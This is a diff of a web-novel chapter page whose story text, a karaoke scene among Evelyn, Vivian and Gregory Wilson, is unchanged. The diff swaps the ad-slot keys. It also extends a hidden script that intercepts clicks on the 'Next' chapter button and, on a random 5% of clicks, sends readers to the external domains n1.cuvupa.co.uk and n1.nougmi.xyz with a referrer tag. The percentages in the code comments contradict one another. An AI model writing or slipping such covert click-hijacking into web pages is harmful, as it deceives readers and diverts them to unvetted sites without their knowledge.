@@ -2390,12 +2390,12 @@
                 <p>Evelyn held the microphone and softly sang along with the rhythm: &#34;Haven&#39;t had the chance to feel the snowflakes bloom in the air... If we shiver together, we&#39;ll understand what tenderness truly means...&#34;</p>
                 <p>Her voice lacked Faye Wong&#39;s ethereal quality, but it carried its own warmth—like a spring breeze skimming the surface of a lake.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>Someone nudged Vivian. &#34;Viv, you call this &#39;can&#39;t sing&#39;? Who are you kidding?&#34;</p>
                 <p>Vivian, mouth full of honeydew melon, mumbled, &#34;I&#39;ve honestly never heard her sing before...&#34;</p>
                 <p>&#34;A woman in her twenties who&#39;s never been to karaoke?&#34;</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
                 <p>&#34;She&#39;s a doctor. She&#39;s always swamped with work. When would she have the time—&#34;</p>
                 <p>The friend smirked. &#34;Maybe she came with a boyfriend?&#34;</p>
                 <p>Vivian smacked the back of his head. &#34;Shut up! Don&#39;t mention that word!&#34;</p>
@@ -2405,7 +2405,7 @@
                 <p>Vivian turned and saw Gregory Wilson had already set down his microphone, his gaze fixed intently on Evelyn.</p>
                 <p>&#34;You don&#39;t think he...&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>Vivian&#39;s eyes lit up. &#34;Hmm... Maybe it&#39;s not such a bad idea?&#34;</p>
                 <p>&#34;Both doctors. Perfect match.&#34;</p>
                 <p>Vivian asked cautiously, &#34;He&#39;s single now, right?&#34;</p>
@@ -2418,7 +2418,7 @@
                 <p>Meetings and partings all have their time. How fitting those lyrics were.</p>
                 <p>A tissue appeared in front of her. She looked up and met a pair of gentle eyes.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
             </div>
             
             <div class="font-controls">
@@ -2540,7 +2540,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2556,8 +2556,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
